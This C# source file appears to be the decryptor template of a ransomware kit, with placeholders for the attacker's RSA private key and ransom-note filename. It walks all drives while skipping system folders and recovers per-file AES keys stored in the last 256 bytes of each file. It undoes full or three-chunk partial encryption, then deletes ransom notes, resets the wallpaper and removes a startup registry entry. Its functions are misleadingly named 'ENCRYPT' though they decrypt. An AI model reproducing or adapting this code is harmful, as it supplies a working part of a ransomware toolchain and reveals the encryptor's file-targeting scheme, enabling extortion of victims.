using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Back
{
    class Program
    {
        // DECRYPTER
        static string RSA_PRIVATE_KEY = "#PRIVATE_KEY";
        static string MESSAGE_FILE = "#MSGFILE";
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        static void Main(string[] args)
        {
            bool createdNew;
            Mutex m = new Mutex(true, Environment.MachineName, out createdNew);
            if (!createdNew)
            {
                return;
            }
            ALL_DRIVES();
            CHANGE_WALLPAPER();
            STARTUP();
        }
        static void ALL_DRIVES()
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                string C = Path.GetPathRoot(Environment.SystemDirectory);
                if (drive.ToString() == C)
                {
                    string[] SkippedFolders = {
                        "windows.old","windows.old.old", "amd", "nvidia", "program files", "program files (x86)", "windows","$recycle.bin","documents and settings",
                        "intel", "perflogs",  "programdata","boot","games","msocache"
                    };
                    string[] SubDirectories = Directory.GetDirectories(C);
                    foreach (string SubDirectory in SubDirectories)
                    {
                        if (!Array.Exists(SkippedFolders, E => E == new DirectoryInfo(SubDirectory).Name.ToLower()))
                        {
                            Task t = Task.Factory.StartNew(() =>
                            {
                                RECURSIVE_DIRECTORY_LOOK(SubDirectory);
                            });
                            t.Wait();
                        }
                    }
                }
                else
                {

                    Task t = Task.Factory.StartNew(() =>
                    {
                        RECURSIVE_DIRECTORY_LOOK(drive.ToString());
                    });
                    t.Wait();
                }
            }
        }

        static string RETURN_FILENAME(string fileName)
        {
            string[] splitedFileName = Path.GetFileName(fileName).Split('.');
            Array.Reverse(splitedFileName);
            string newFilePath = fileName.Replace("." + splitedFileName[0], "");
            return newFilePath;
        }

        static void RECURSIVE_DIRECTORY_LOOK(string location)
        {
            try
            {
                string[] files = Directory.GetFiles(location);
                foreach (string file in files)
                {
                    try
                    {
                        string[] SplitFileName = Path.GetFileName(file).Split('.');
                        Array.Reverse(SplitFileName);
                        if (SplitFileName.Length > 2)
                        {
                            FileInfo FileProperty = new FileInfo(file);
                            if (FileProperty.IsReadOnly)
                            {
                                try
                                {
                                    FileProperty.Attributes = FileAttributes.Normal;
                                }
                                catch { }
                            }

                            if (FileProperty.Length < 524288)
                            {

                                FULL_ENCRYPT(file);
                                File.Move(file, RETURN_FILENAME(file));
                            }
                            else if (FileProperty.Length > 524288)
                            {
                                TRIPLE_ENCRYPT(file, 131072, 0, (FileProperty.Length - 256) / 2, (FileProperty.Length - 256) - 131072);
                                File.Move(file, RETURN_FILENAME(file));
                            }

                        }
                        if (file.Contains(MESSAGE_FILE))
                        {
                            File.Delete(file);

                        }
                    }
                    catch { }
                }

                string[] SubDirectories = Directory.GetDirectories(location);
                foreach (string SubdDirectory in SubDirectories)
                {
                    var directory = new DirectoryInfo(SubdDirectory);
                    if (directory.Attributes.HasFlag(FileAttributes.ReadOnly))
                    {
                        try
                        {
                            directory.Attributes &= ~FileAttributes.Normal;
                        }
                        catch { }
                    }
                    if (!directory.Attributes.HasFlag(FileAttributes.Hidden))
                    {
                        RECURSIVE_DIRECTORY_LOOK(SubdDirectory);

                    }
                }
            }
            catch { }
        }

        static void TRIPLE_ENCRYPT(string filePath, int length, int beginning, long middle, long end)
        {
            byte[] encrypted_RSA = CUT_TAIL(filePath);
            string KEY = Encoding.ASCII.GetString(encrypted_RSA).Split('|')[0];
            string IV = Encoding.ASCII.GetString(encrypted_RSA).Split('|')[1];

            using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
            {

                stream.Position = beginning;
                byte[] readBegin = new byte[length];
                stream.Read(readBegin, 0, length);
                byte[] plainBytesBegin = ENCRYPT_DATA(KEY, IV, readBegin);
                stream.Position = beginning;
                stream.Write(plainBytesBegin, 0, plainBytesBegin.Length);

                stream.Position = middle;
                byte[] readMiddle = new byte[length];
                stream.Read(readMiddle, 0, length);
                byte[] plainBytesMiddle = ENCRYPT_DATA(KEY, IV, readMiddle);
                stream.Position = middle;
                stream.Write(plainBytesMiddle, 0, plainBytesMiddle.Length);

                stream.Position = end;
                byte[] readEnd = new byte[length];
                stream.Read(readEnd, 0, length);
                byte[] plainBytesEnd = ENCRYPT_DATA(KEY, IV, readEnd);
                stream.Position = end;
                stream.Write(plainBytesEnd, 0, plainBytesEnd.Length);

            }
            // stream.Write(encryptedBytes, fileLength, encryptedBytes.Length);

        }

        private static void STARTUP()
        {
            try
            {
                Microsoft.Win32.RegistryKey startupKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                startupKey.DeleteValue(MESSAGE_FILE.Split('.')[0]);
                startupKey.Close();
            }
            catch { }
        }

        static byte[] ENCRYPT_DATA(string KEY, string IV, byte[] chiperText)
        {
            using (System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Key = Encoding.ASCII.GetBytes(KEY);//GenerateRandomString(32);
                AES.IV = Encoding.ASCII.GetBytes(IV);//GenerateRandomString(16);
                AES.Mode = CipherMode.CBC;
                AES.Padding = PaddingMode.None;
                ICryptoTransform cTransform = AES.CreateDecryptor();
                return cTransform.TransformFinalBlock(chiperText, 0, chiperText.Length);
            }
        }


        static void FULL_ENCRYPT(string filePath)
        {
            byte[] encrypted_RSA = CUT_TAIL(filePath);
          
            
            string KEY = Encoding.ASCII.GetString(encrypted_RSA).Split('|')[0];
            string IV = Encoding.ASCII.GetString(encrypted_RSA).Split('|')[1];
            byte[] bytesToBeEncrypted = File.ReadAllBytes(filePath);
            using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
            {
                stream.SetLength(0);
                byte[] encryptedBytes = null;
                using (MemoryStream ms = new MemoryStream())
                {
                    using (System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        AES.Key = Encoding.ASCII.GetBytes(KEY);
                        AES.IV = Encoding.ASCII.GetBytes(IV);
                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }
                stream.Write(encryptedBytes, 0, encryptedBytes.Length);
            }
        }

        static byte[] RSA_ENCRYPT(string privateKeyString, byte[] encryptedData)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.FromXmlString(privateKeyString);
                return rsa.Decrypt(encryptedData, false);
            }
        }

        static byte[] CUT_TAIL(string path)
        {
            using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                fs.Seek(-256, SeekOrigin.End);
                byte[] bytes = new byte[256];
                fs.Read(bytes, 0, 256);
                byte[] RSA_DECRYPTED_BYTES = RSA_ENCRYPT(RSA_PRIVATE_KEY, bytes);
                fs.SetLength(fs.Length - 256);
                fs.Close();
                return RSA_DECRYPTED_BYTES;
            }
        }

        public static void CHANGE_WALLPAPER()
        {
            string defaultWalpaper = @"C:\Windows\Web\Wallpaper\Windows\img0.jpg";
            if (File.Exists(defaultWalpaper))
            {
                SystemParametersInfo(0x14, 0, defaultWalpaper, 0x01 | 0x02);
            }
            else
            {
                Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
                int screenWidth = screenBounds.Width;
                int screenHeight = screenBounds.Height;
                Bitmap bitmap = new Bitmap(screenWidth, screenHeight);
                using (Graphics graphics = Graphics.FromImage(bitmap))
                {
                    graphics.Clear(Color.DodgerBlue);
                }
                string pathName = Path.GetTempPath() + RANDOM_STRING(9) + ".jpg";
                bitmap.Save(pathName, ImageFormat.Jpeg);
                SystemParametersInfo(0x14, 0, pathName, 0x01 | 0x02);
            }
        }

        static string RANDOM_STRING(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] uintBuffer = new byte[sizeof(uint)];

                while (length-- > 0)
                {
                    rng.GetBytes(uintBuffer);
                    uint num = BitConverter.ToUInt32(uintBuffer, 0);
                    res.Append(valid[(int)(num % (uint)valid.Length)]);
                }
            }

            return res.ToString();
        }

    }
}
